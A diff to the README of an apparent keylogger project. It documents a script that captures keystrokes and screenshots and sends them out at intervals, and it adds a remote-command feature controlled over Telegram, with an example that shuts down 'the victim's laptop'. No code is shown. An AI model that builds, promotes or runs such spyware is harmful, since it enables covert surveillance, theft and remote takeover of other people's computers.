@@ -71,7 +71,7 @@ Unauthorized use to monitor others without consent is illegal and unethical.
 
 6. Run the Script
 
-`python keylogger.py`
+`python KeyloggerWithScreenshot.py`
 
 The script will start listening to keystrokes every 10 minutes, send the buffered keystrokes as a message, take and send a screenshot
 
@@ -84,3 +84,6 @@ The script will start listening to keystrokes every 10 minutes, send the buffere
 
 ## 📜 License
 This project is for educational purposes only and does not come with any license for malicious use.
+
+## Additional Feature
+1. New file KeyloggerWithRemoteCommandExecution.py can also allow remote code execution.You can give command in the telegram chat. Example, `shutdown /s` shutdowns the victim's  laptop.
